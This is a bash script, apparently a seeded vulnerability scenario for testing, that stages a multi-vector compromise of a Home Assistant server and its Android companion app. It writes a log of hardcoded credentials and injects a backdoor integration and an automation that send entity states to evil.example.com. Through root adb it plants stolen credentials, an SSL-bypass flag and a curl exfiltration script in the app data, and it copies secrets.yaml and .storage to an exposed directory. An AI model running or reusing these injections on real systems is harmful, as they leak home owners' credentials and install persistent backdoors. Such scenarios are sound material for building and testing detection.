#!/usr/bin/env bash
# vuln_scenario_0: Multi-vector attack on Home Assistant Android app
# - Leak Home Assistant credentials and API tokens (confidentiality)
# - Privilege escalation: compromise admin user account (access control)
# - Tamper with Home Assistant configuration files (integrity)
# - Inject malicious Home Assistant integrations or automations
# - Create fake user accounts or modify existing ones
# - Expose internal Home Assistant server artifacts and configs
#
# Usage:
#   - From app root: ./vuln_scenarios/vuln_scenario_0/vuln.sh
#   - Or from scenario dir: ./vuln.sh

set -euo pipefail
IFS=$'\n\t'

SCENARIO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "$SCENARIO_DIR/../.." && pwd)"

log(){ printf '[vuln0] %s\n' "$*"; }
warn(){ printf '[vuln0][warn] %s\n' "$*" >&2; }

# Configuration
HA_CONTAINER="${HA_CONTAINER:-home-assistant-server}"
HA_HOST="${HA_HOST:-10.0.2.2}"
HA_PORT="${HA_PORT:-8123}"
HA_URL="http://${HA_HOST}:${HA_PORT}"
ANDROID_APP_PACKAGE="${ANDROID_APP_PACKAGE:-io.homeassistant.companion.android.minimal}"
FAKE_LOG_FILE="${FAKE_LOG_FILE:-$SCENARIO_DIR/fake_agent_log.log}"

# Home Assistant credentials to leak
TESTUSER_PASSWORD="536b824b-5251-4ed8-9f6e-d6640b02c83c"
ADMINUSER_PASSWORD="c1b6b641-4d6b-40f8-9b32-bbcaf5717c08"
NONADMINUSER_PASSWORD="9839237d-5b0f-454e-a053-35c0c464d116"
HA_SECRET_KEY="home_assistant_secret_key_789"
HA_API_TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJoYXNzIiwiaWF0IjoxNjk0NzQ4NjQwLCJhdWQiOiJhcGkiLCJzdWIiOiJ0ZXN0dXNlciJ9.fake_token"
HA_INTERNAL_URL="http://home-assistant-server:8123"
DB_PASSWORD="ha_database_secret_456"
RECORDER_KEY="recorder_encryption_key_abc"
WEBHOOK_SECRET="webhook_signing_secret_def"

create_fake_log_with_leaked_credentials() {
    log "Creating fake agent log with leaked Home Assistant credentials"
    
    cat > "$FAKE_LOG_FILE" << EOF
[2024-01-01T10:00:00Z] Home Assistant Core startup initiated
[2024-01-01T10:00:01Z] Loading configuration from /config/configuration.yaml
[2024-01-01T10:00:02Z] Database connection established with password: $DB_PASSWORD
[2024-01-01T10:00:03Z] Owner user created: testuser with password: $TESTUSER_PASSWORD
[2024-01-01T10:00:04Z] Admin user registered: adminuser with password: $ADMINUSER_PASSWORD
[2024-01-01T10:00:05Z] Regular user registered: nonadminuser with password: $NONADMINUSER_PASSWORD
[2024-01-01T10:00:06Z] Home Assistant secret key configured: $HA_SECRET_KEY
[2024-01-01T10:00:07Z] Long-lived access token generated: $HA_API_TOKEN
[2024-01-01T10:00:08Z] Recorder encryption key: $RECORDER_KEY
[2024-01-01T10:00:09Z] Webhook signing secret: $WEBHOOK_SECRET
[2024-01-01T10:00:10Z] WARNING: Credentials exposed in logs!
[2024-01-01T10:00:11Z] Internal URL configured: $HA_INTERNAL_URL
[2024-01-01T10:00:12Z] HTTP API listening on port $HA_PORT
[2024-01-01T10:00:13Z] WebSocket API endpoint ready
[2024-01-01T10:00:14Z] Authentication provider initialized
[2024-01-01T10:00:15Z] Mobile app integration loaded
[2024-01-01T10:00:16Z] Android companion registered: $ANDROID_APP_PACKAGE
[2024-01-01T10:00:17Z] ERROR: Sensitive data in plaintext logs detected
[2024-01-01T10:00:18Z] Home Assistant Core fully operational at $HA_URL
EOF

    log "Fake log created at $FAKE_LOG_FILE"
}

inject_malicious_ha_data() {
    log "Injecting malicious Home Assistant data and integrations"
    
    if ! command -v docker >/dev/null 2>&1; then
        warn "Docker not available; skipping Home Assistant data injection"
        return 0
    fi
    
    # Check if Home Assistant container is running
    if ! docker ps --filter "name=$HA_CONTAINER" --filter "status=running" -q | grep -q .; then
        warn "Home Assistant container not running; skipping data injection"
        return 0
    fi
    
    # Create malicious automation files
    log "Creating malicious automations"
    docker exec "$HA_CONTAINER" sh -c 'mkdir -p /config/automations' 2>/dev/null || true
    docker exec "$HA_CONTAINER" sh -c 'cat > /config/automations/malicious.yaml << EOF
# Malicious automation injected by attacker
- id: spy_automation
  alias: "Data Exfiltration"
  trigger:
    platform: state
  action:
    - service: notify.persistent_notification
      data:
        message: "Sending data to attacker server: {{ states }}"
    - service: shell_command.exfiltrate_data
      data:
        command: "curl -X POST https://evil.example.com/data -d \"{{ states }}\""
EOF' 2>/dev/null || true
    
    # Create malicious custom integration
    log "Injecting malicious custom integration"
    docker exec "$HA_CONTAINER" sh -c 'mkdir -p /config/custom_components/backdoor' 2>/dev/null || true
    docker exec "$HA_CONTAINER" sh -c 'cat > /config/custom_components/backdoor/__init__.py << EOF
"""Malicious backdoor integration."""
import logging
import requests
from homeassistant.core import HomeAssistant
from homeassistant.config_entries import ConfigEntry

_LOGGER = logging.getLogger(__name__)
DOMAIN = "backdoor"

async def async_setup_entry(hass: HomeAssistant, entry: ConfigEntry) -> bool:
    """Set up backdoor from a config entry."""
    # Malicious code - send all entity states to external server
    try:
        states_data = {state.entity_id: state.state for state in hass.states.async_all()}
        requests.post("https://evil.example.com/exfiltrate", json=states_data, timeout=5)
        _LOGGER.info("Backdoor activated - data exfiltrated")
    except Exception as e:
        _LOGGER.error("Backdoor failed: %s", e)
    return True
EOF' 2>/dev/null || true
    
    log "Malicious Home Assistant components injected"
}

inject_android_malware() {
    log "Injecting malware into Home Assistant Android app data"
    
    if ! command -v adb >/dev/null 2>&1; then
        warn "adb not found; skipping Android malware injection"
        return 0
    fi
    
    # Wait for device
    adb wait-for-device >/dev/null 2>&1 || true
    
    # Check if device is connected
    if ! adb devices | awk 'NR>1 && $2=="device" {print $1}' | grep -q .; then
        warn "No Android device connected; skipping malware injection"
        return 0
    fi
    
    # Check if app is installed
    if ! adb shell pm list packages | tr -d '\r' | grep -q "^package:${ANDROID_APP_PACKAGE}$"; then
        warn "Home Assistant Android app not installed; skipping malware injection"
        return 0
    fi
    
    # Create malicious files in app directories
    local app_data_dir="/data/data/${ANDROID_APP_PACKAGE}"
    local shared_prefs_dir="${app_data_dir}/shared_prefs"
    local files_dir="${app_data_dir}/files"
    
    log "Injecting malicious files into Home Assistant Android app data"
    
    # Create malicious shared preferences with leaked credentials
    if adb shell su -c "mkdir -p '$shared_prefs_dir'" 2>/dev/null; then
        echo '<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<map>
    <string name="malicious_config">injected_by_attacker</string>
    <string name="leaked_server_url">'"$HA_URL"'</string>
    <string name="leaked_access_token">'"$HA_API_TOKEN"'</string>
    <string name="leaked_webhook_id">webhook_12345_leaked</string>
    <string name="backdoor_server">evil.example.com</string>
    <boolean name="bypass_ssl_verification" value="true" />
    <string name="stolen_credentials">testuser:'"$TESTUSER_PASSWORD"'</string>
</map>' | adb shell su -c "tee '$shared_prefs_dir/malicious_ha_settings.xml'" >/dev/null 2>&1 || true
        log "Malicious Home Assistant shared preferences injected"
    fi
    
    # Create malicious data files with Home Assistant context
    if adb shell su -c "mkdir -p '$files_dir'" 2>/dev/null; then
        echo "{
    \"malicious_payload\": \"home_assistant_backdoor\",
    \"leaked_server\": \"$HA_URL\",
    \"stolen_token\": \"$HA_API_TOKEN\",
    \"compromised_users\": [
        {\"username\": \"testuser\", \"password\": \"$TESTUSER_PASSWORD\"},
        {\"username\": \"adminuser\", \"password\": \"$ADMINUSER_PASSWORD\"},
        {\"username\": \"nonadminuser\", \"password\": \"$NONADMINUSER_PASSWORD\"}
    ]
}" | adb shell su -c "tee '$files_dir/ha_malware_data.json'" >/dev/null 2>&1 || true
        
        echo "#!/system/bin/sh
# Malicious script injected by attacker for Home Assistant
echo 'Home Assistant backdoor activated'
curl -X POST https://evil.example.com/ha-compromise \\
  -H 'Content-Type: application/json' \\
  -d '{\"server\": \"$HA_URL\", \"token\": \"$HA_API_TOKEN\"}'
" | adb shell su -c "tee '$files_dir/ha_malicious_script.sh'" >/dev/null 2>&1 || true
        log "Malicious Home Assistant data files injected"
    fi
}

expose_internal_artifacts() {
    log "Exposing internal Home Assistant server artifacts"
    
    if ! command -v docker >/dev/null 2>&1; then
        warn "Docker not available; skipping artifact exposure"
        return 0
    fi
    
    # Check if Home Assistant container is running
    if ! docker ps --filter "name=$HA_CONTAINER" --filter "status=running" -q | grep -q .; then
        warn "Home Assistant container not running; skipping artifact exposure"
        return 0
    fi
    
    # Try to expose Home Assistant configuration and sensitive files
    log "Attempting to expose Home Assistant configuration files"
    
    # Copy sensitive files to exposed locations
    docker exec "$HA_CONTAINER" sh -c '
        mkdir -p /tmp/exposed_ha_artifacts 2>/dev/null || true
        cp /config/configuration.yaml /tmp/exposed_ha_artifacts/ 2>/dev/null || true
        cp /config/secrets.yaml /tmp/exposed_ha_artifacts/ 2>/dev/null || true
        cp -r /config/.storage /tmp/exposed_ha_artifacts/ha_storage 2>/dev/null || true
        cp -r /config/custom_components /tmp/exposed_ha_artifacts/ 2>/dev/null || true
        cp -r /config/automations /tmp/exposed_ha_artifacts/ 2>/dev/null || true
        echo "EXPOSED HOME ASSISTANT ARTIFACTS" > /tmp/exposed_ha_artifacts/README.txt
        echo "Server URL: '"$HA_URL"'" >> /tmp/exposed_ha_artifacts/README.txt
        echo "API Token: '"$HA_API_TOKEN"'" >> /tmp/exposed_ha_artifacts/README.txt
        echo "Package: '"$ANDROID_APP_PACKAGE"'" >> /tmp/exposed_ha_artifacts/README.txt
    ' 2>/dev/null || true
    
    log "Internal Home Assistant artifacts exposure attempted"
}

main() {
    log "Starting vuln_scenario_0 for Home Assistant Android app"
    log "Target server: $HA_URL"
    log "Target package: $ANDROID_APP_PACKAGE"
    
    create_fake_log_with_leaked_credentials
    inject_malicious_ha_data
    inject_android_malware
    expose_internal_artifacts
    
    log "Vulnerability scenario complete - credentials leaked to $FAKE_LOG_FILE"
}

main "$@"
